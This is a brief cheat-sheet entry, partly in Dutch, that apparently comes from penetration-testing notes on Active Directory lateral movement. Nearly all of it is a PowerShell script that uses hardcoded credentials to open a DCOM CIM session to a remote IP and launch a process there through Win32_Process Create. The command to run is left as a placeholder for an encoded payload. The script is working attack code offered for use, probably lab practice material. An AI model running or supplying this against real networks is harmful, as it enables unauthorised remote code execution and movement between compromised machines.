# 24. AD Lateral Movement — Entry 4

## Categorie

WMIC

## Commando

```
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'HERE WE PLACE THE PAYLOAD GENERATED WITH encode.py';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## Omschrijving

Full script

## Voorbeeld

_(empty)_

## Opmerkingen

_(empty)_

